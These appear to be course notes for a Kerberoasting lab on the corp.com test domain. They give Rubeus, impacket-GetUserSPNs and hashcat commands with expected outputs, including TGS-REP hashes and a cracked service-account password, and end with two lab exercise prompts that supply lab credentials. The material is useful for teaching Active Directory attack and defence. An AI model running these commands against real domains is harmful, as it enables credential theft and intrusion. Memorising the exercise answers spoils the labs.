# Kerberoasting

Utilizing Rubeus to perform a Kerberoast attack
>``` shell
>PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
>
># ========== Expected Result ==========
>   ______        _
>  (_____ \      | |
>   _____) )_   _| |__  _____ _   _  ___
>  |  __  /| | | |  _ \| ___ | | | |/___)
>  | |  \ \| |_| | |_) ) ____| |_| |___ |
>  |_|   |_|____/|____/|_____)____/(___/
>
>  v2.1.2
>
>
>[*] Action: Kerberoasting
>
>[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
>[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
>
>[*] Target Domain          : corp.com
>[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
>
>[*] Total kerberoastable users : 1
>
>
>[*] SamAccountName         : iis_service
>[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
>[*] ServicePrincipalName   : HTTP/web04.corp.com:80
>[*] PwdLastSet             : 9/7/2022 5:38:43 AM
>[*] Supported ETypes       : RC4_HMAC_DEFAULT
>[*] Hash written to C:\Tools\hashes.kerberoast
># =====================================
>```

Reviewing the correct Hashcat mode
>``` shell
>kali@kali:~$ cat hashes.kerberoast
>
># ========== Expected Result ==========
>$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940AD9DCF5DD5CD8E91A86D4BA0396DB$F57066A4F4F8FF5D70DF39B0C98ED7948A5DB08D689B92446E600B49FD502DEA39A8ED3B0B766E5CD40410464263557BC0E4025BFB92D89BA5C12C26C72232905DEC4D060D3C8988945419AB4A7E7ADEC407D22BF6871D...
>...
># =====================================
>
>kali@kali:~$ hashcat --help | grep -i "Kerberos"  
>
># ========== Expected Result ==========
>  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
>  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
>  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
>  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
>   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
>  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
>  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
># =====================================
>```

Cracking the TGS-REP hash
>``` shell
>kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
>
># ========== Expected Result ==========
>...
>$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940ad9dcf5dd5cd8e91a86d4ba0396db$f57066a4f4f8ff5d70df39b0c98ed7948a5db08d689b92446e600b49fd502dea39a8ed3b0b766e5cd40410464263557bc0e4025bfb92d89ba5c12c26c72232905dec4d060d3c8988945419ab4a7e7adec407d22bf6871d
>...
>d8a2033fc64622eaef566f4740659d2e520b17bd383a47da74b54048397a4aaf06093b95322ddb81ce63694e0d1a8fa974f4df071c461b65cbb3dbcaec65478798bc909bc94:Strawberry1
>...
># =====================================
>```

Using impacket-GetUserSPNs to perform Kerberoasting on Linux
>``` shell
>kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete 
>
># ========== Expected Result ==========
>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
>
>Password:
>ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon  Delegation 
>----------------------  -----------  --------  --------------------------  ---------  ----------
>HTTP/web04.corp.com:80  iis_service            2022-09-07 08:38:43.411468  <never>               
>
>
>[-] CCache file is not found. Skipping...
>$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de60$ac1459588a99d36fb31cee7aefb03cd740e9cc6d9816806cc1ea44b147384afb551723719a6d3b960adf6b2ce4e2741f7d0ec27a87c4c8bb4e5b1bb455714d3dd52c16a4e4c242df94897994ec0087cf5cfb16c2cb64439d514241eec...
># =====================================
>```

Cracking the TGS-REP hash
>``` shell
>kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
>
># ========== Expected Result ==========
>...
>$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de60$ac1459588a99d36fb31cee7aefb03cd740e9cc6d9816806cc1ea44b147384afb551723719a6d3b960adf6b2ce4e2741f7d0ec27a87c4c8bb4e5b1bb455714d3dd52c16a4e4c242df94897994ec0087cf5cfb16c2cb64439d514241eec
>...
>a96a7e6e29aa173b401935f8f3a476cdbcca8f132e6cc8349dcc88fcd26854e334a2856c009bc76e4e24372c4db4d7f41a8be56e1b6a912c44dd259052299bac30de6a8d64f179caaa2b7ee87d5612cd5a4bb9f050ba565aa97941ccfd634b:Strawberry1
>...
># =====================================
>```

Lab 1 - Follow the steps outlined in this section to obtain the plaintext password of iis_service on Windows and Kali by performing Kerberoasting. What is the correct Hashcat mode to crack TGS-REP hashes?
>``` shell
>
>```
>

Lab 2 - Once VM Group 2 is started, the domain corp.com has been slightly modified. Use the techniques from this section to obtain another plaintext password by performing Kerberoasting and enter it as answer to this exercise. To crack the TGS-REP hash, create and utilize a rule file which adds a "1" to the passwords of rockyou.txt. To perform the attack, you can use the user jeff with the password HenchmanPutridBonbon11.
>``` shell
>
>```
>
